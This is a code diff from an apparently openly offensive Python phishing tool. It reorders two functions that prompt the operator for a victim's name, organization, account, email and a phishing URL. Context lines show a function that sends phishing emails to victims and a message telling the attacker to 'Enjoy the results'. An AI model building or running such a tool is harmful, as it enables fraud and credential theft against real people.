@@ -53,6 +53,34 @@ def sendMensageToVictim(htmlTosend,subject,emailofthevictim, emailoftheatacker):
 
     print("Phishing Email was send\n Enjoy the results")
 
+def get_input_es():
+    #Información de la victima
+    userName = input("Enter the name of your victim-->")
+    organization = input("Enter the organizacion-->")
+    userAccount = input("Introduce la cuenta de usuario de tu victima-->")
+    url=input("Introduce el URL de phishing-->")
+    userEmail=input("Introduce el email de la victima-->")
+    
+    date=time.localtime()
+    currentDate=time.strftime("%D %B %Y, %H:%M:%S",date)
+    
+    return userName,organization,url,userEmail,currentDate,userAccount
+
+def get_inputs_en():
+    #Info of the victim
+    userName = input("Enter the name of your victim-->")
+    organization = input("Enter the organization-->")
+    userAccount = input("Enter the username of the victim's account-->")
+    url=input("Enter the phishing URL-->")
+    userEmail=input("Enter the victim's email-->")
+    
+    #data time
+    date=time.localtime()
+    currentDate=time.strftime("%D %B %Y, %H:%M:%S",date)
+    
+    return userName,organization,url,userEmail,currentDate,userAccount
+
+#Flask
 def generateUrlAccess():
     #Generating of an URL to access
     app=Flask(__name__)
@@ -103,29 +131,3 @@ def generateUrlAccess():
         app.run(debug=True, port=5000)
         
         
-def get_input_es():
-    #Información de la victima
-    userName = input("Enter the name of your victim-->")
-    organization = input("Enter the organizacion-->")
-    userAccount = input("Introduce la cuenta de usuario de tu victima-->")
-    url=input("Introduce el URL de phishing-->")
-    userEmail=input("Introduce el email de la victima-->")
-    
-    date=time.localtime()
-    currentDate=time.strftime("%D %B %Y, %H:%M:%S",date)
-    
-    return userName,organization,url,userEmail,currentDate,userAccount
-
-def get_inputs_en():
-    #Info of the victim
-    userName = input("Enter the name of your victim-->")
-    organization = input("Enter the organization-->")
-    userAccount = input("Enter the username of the victim's account-->")
-    url=input("Enter the phishing URL-->")
-    userEmail=input("Enter the victim's email-->")
-    
-    #data time
-    date=time.localtime()
-    currentDate=time.strftime("%D %B %Y, %H:%M:%S",date)
-    
-    return userName,organization,url,userEmail,currentDate,userAccount
